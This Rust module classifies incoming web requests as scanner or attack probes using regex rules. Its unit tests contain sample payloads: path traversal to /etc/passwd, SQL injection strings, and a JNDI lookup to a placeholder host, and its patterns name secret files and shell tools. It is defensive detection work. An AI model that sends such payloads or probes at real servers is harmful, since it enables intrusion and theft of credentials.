//! Rules that flag scanner and attack requests by their target (path and query).

use std::borrow::Cow;

use anyhow::{Context, Result};
use regex::Regex;
use serde::Deserialize;

#[derive(Debug, Clone, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ProbeRule {
    pub name: String,
    pub pattern: String,
}

/// Built-in rules, checked in order. The first match names the probe.
const DEFAULT_RULES: &[(&str, &str)] = &[
    ("env-file", r"(?i)/\.env\b"),
    ("vcs", r"(?i)/\.(git|svn|hg)(/|\?|$)"),
    (
        "wordpress",
        r"(?i)/(wp-login\.php|wp-admin|wp-content|wp-includes|xmlrpc\.php)",
    ),
    ("db-admin", r"(?i)/(phpmyadmin|adminer|pma)(/|\.php|\?|$)"),
    (
        "secret-file",
        r"(?i)/(\.aws|\.ssh|\.htpasswd|id_rsa|id_ed25519|credentials|config\.json)(/|\?|$)",
    ),
    (
        "backup-file",
        r"(?i)\.(sql|bak|old|swp|sqlite3?|db|tar\.gz|zip)(\?|$)",
    ),
    ("path-traversal", r"(?i)(\.\./|\.\.\\|%2e%2e|%252e)"),
    (
        "sql-injection",
        r"(?i)(union\s+(all\s+)?select|\bor\s+1\s*=\s*1|'\s*or\s*'|sleep\s*\(\s*\d|benchmark\s*\(|information_schema|waitfor\s+delay)",
    ),
    (
        "command-injection",
        r"(?i)(\$\{jndi:|/bin/(ba)?sh\b|[;|]\s*(wget|curl)\s|/etc/passwd|/proc/self/)",
    ),
    (
        "scanner-path",
        r"(?i)/(cgi-bin|boaform|hnap1|actuator|vendor/phpunit|solr)",
    ),
];

/// Display title and a one-line description of a rule. Rules from the
/// config keep their own name.
pub fn describe(rule: &str) -> (&str, &'static str) {
    match rule {
        "env-file" => (
            "Environment files",
            "Requests for .env files, which often hold credentials.",
        ),
        "vcs" => (
            "VCS metadata",
            "Requests for .git, .svn or .hg, which expose source and history.",
        ),
        "wordpress" => ("WordPress", "Known WordPress endpoints and plugin paths."),
        "db-admin" => ("Database admin panels", "phpMyAdmin, Adminer and similar."),
        "secret-file" => (
            "Credentials and keys",
            "Cloud credentials, SSH keys, .htpasswd, config.json.",
        ),
        "backup-file" => (
            "Backup files",
            "Archives and dumps such as site.zip or backup.sql.",
        ),
        "path-traversal" => (
            "Path traversal",
            "../ sequences aimed at files outside the web root.",
        ),
        "sql-injection" => (
            "SQL injection",
            "SQL fragments in the path or query string.",
        ),
        "command-injection" => (
            "Command injection",
            "Shell commands, /etc/passwd, JNDI lookups.",
        ),
        "scanner-path" => (
            "Device and framework exploits",
            "Router, camera, Spring Actuator and PHPUnit paths.",
        ),
        other => (other, "Custom rule."),
    }
}

/// What the server did with a request, in one word.
pub fn outcome(status: u16) -> Outcome {
    match status {
        200..=299 => Outcome::Answered,
        300..=399 => Outcome::Redirected,
        404 | 410 => Outcome::NotFound,
        500..=599 => Outcome::Failed,
        _ => Outcome::Blocked,
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Outcome {
    /// Refused or connection closed (4xx other than 404, nginx's 444).
    Blocked,
    NotFound,
    Redirected,
    Answered,
    Failed,
}

impl Outcome {
    pub fn label(self) -> &'static str {
        match self {
            Self::Blocked => "blocked",
            Self::NotFound => "not found",
            Self::Redirected => "redirected",
            Self::Answered => "served",
            Self::Failed => "server error",
        }
    }
}

pub fn default_rules() -> Vec<ProbeRule> {
    DEFAULT_RULES
        .iter()
        .map(|(name, pattern)| ProbeRule {
            name: name.to_string(),
            pattern: pattern.to_string(),
        })
        .collect()
}

pub struct ProbeMatcher {
    rules: Vec<(String, Regex)>,
}

impl ProbeMatcher {
    pub fn new(rules: &[ProbeRule]) -> Result<Self> {
        let rules = rules
            .iter()
            .map(|rule| {
                let regex = Regex::new(&rule.pattern).with_context(|| {
                    format!("probe rule '{}' has an invalid pattern", rule.name)
                })?;
                Ok((rule.name.clone(), regex))
            })
            .collect::<Result<_>>()?;
        Ok(Self { rules })
    }

    /// Name of the first rule that matches the target, as sent or URL-decoded.
    pub fn classify(&self, target: &str) -> Option<&str> {
        let decoded = percent_decode(target);
        self.rules
            .iter()
            .find(|(_, regex)| regex.is_match(target) || regex.is_match(&decoded))
            .map(|(name, _)| name.as_str())
    }
}

/// Decodes %XX escapes and '+' as a space. Broken escapes are kept as they are.
fn percent_decode(s: &str) -> Cow<'_, str> {
    if !s.contains(['%', '+']) {
        return Cow::Borrowed(s);
    }
    let bytes = s.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'%' if i + 2 < bytes.len() => {
                if let (Some(high), Some(low)) = (hex(bytes[i + 1]), hex(bytes[i + 2])) {
                    out.push((high << 4) | low);
                    i += 3;
                    continue;
                }
                out.push(b'%');
            }
            b'+' => out.push(b' '),
            b => out.push(b),
        }
        i += 1;
    }
    Cow::Owned(String::from_utf8_lossy(&out).into_owned())
}

fn hex(b: u8) -> Option<u8> {
    (b as char).to_digit(16).map(|d| d as u8)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn matcher() -> ProbeMatcher {
        ProbeMatcher::new(&default_rules()).unwrap()
    }

    #[test]
    fn flags_common_probes() {
        let m = matcher();
        let cases = [
            ("/.env", "env-file"),
            ("/app/.env.bak", "env-file"),
            ("/.git/config", "vcs"),
            ("/wp-login.php", "wordpress"),
            ("/phpmyadmin/index.php", "db-admin"),
            ("/.aws/credentials", "secret-file"),
            ("/backup.sql", "backup-file"),
            ("/static/../../etc/passwd", "path-traversal"),
            ("/%2e%2e/%2e%2e/etc/passwd", "path-traversal"),
            ("/item?id=1%20UNION%20SELECT%20password", "sql-injection"),
            ("/search?q=a'+or+'1'='1", "sql-injection"),
            ("/?x=${jndi:ldap://example.com/a}", "command-injection"),
            ("/cgi-bin/luci", "scanner-path"),
        ];
        for (target, want) in cases {
            assert_eq!(m.classify(target), Some(want), "{target}");
        }
    }

    #[test]
    fn leaves_normal_requests_alone() {
        let m = matcher();
        let targets = [
            "/",
            "/shop/?page=2",
            "/static/css/site.css",
            "/product/42/",
            "/search?q=hair+oil",
            "/.well-known/acme-challenge/abc",
        ];
        for target in targets {
            assert_eq!(m.classify(target), None, "{target}");
        }
    }

    #[test]
    fn rejects_invalid_pattern() {
        let rules = [ProbeRule {
            name: "broken".into(),
            pattern: "(".into(),
        }];
        let err = ProbeMatcher::new(&rules).err().unwrap();
        assert!(err.to_string().contains("broken"));
    }

    #[test]
    fn every_built_in_rule_has_a_plain_name() {
        for rule in default_rules() {
            assert_ne!(describe(&rule.name).0, rule.name, "{}", rule.name);
        }
        assert_eq!(describe("my-rule").0, "my-rule");
    }

    #[test]
    fn names_outcomes() {
        assert_eq!(outcome(444), Outcome::Blocked);
        assert_eq!(outcome(403), Outcome::Blocked);
        assert_eq!(outcome(404), Outcome::NotFound);
        assert_eq!(outcome(302), Outcome::Redirected);
        assert_eq!(outcome(200), Outcome::Answered);
        assert_eq!(outcome(502), Outcome::Failed);
    }

    #[test]
    fn decodes_percent_escapes() {
        assert_eq!(percent_decode("a%2Fb+c%zz"), "a/b c%zz");
        assert_eq!(percent_decode("plain"), "plain");
    }
}
